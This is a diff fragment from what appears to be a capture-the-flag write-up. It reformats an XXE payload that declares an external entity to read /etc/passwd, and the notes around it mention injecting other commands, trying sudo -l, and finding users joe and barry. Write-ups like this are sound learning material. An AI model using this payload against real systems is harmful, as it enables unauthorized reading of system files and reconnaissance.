@@ -81,11 +81,10 @@ Progress: 220557 / 220558 (100.00%)
 </br>(in the second line, changing `<!DOCTYPE root [<!ENTITY read SYSTEM '<command>'> ]>`] allows me to inject other commands)
 </br>modded to list sudo -l, but that does nothing... next, try to read file /etc/passwd by modifying the code as shown in the sample below
 </br>
-```
-<?xml version="1.0" encoding="UTF-8"?>
-<!DOCTYPE author [<!ENTITY read SYSTEM 'file:///etc/passwd'>]>
-<root><author>&read;</author></root>
-```
+
+`<?xml version="1.0" encoding="UTF-8"?>`
+`<!DOCTYPE author [<!ENTITY read SYSTEM 'file:///etc/passwd'>]>`
+`<root><author>&read;</author></root>`
 
 </br>shows some users, as is the whole goal of peeking into /etc/passwd
 </br> --> /home/joe & /home/barry
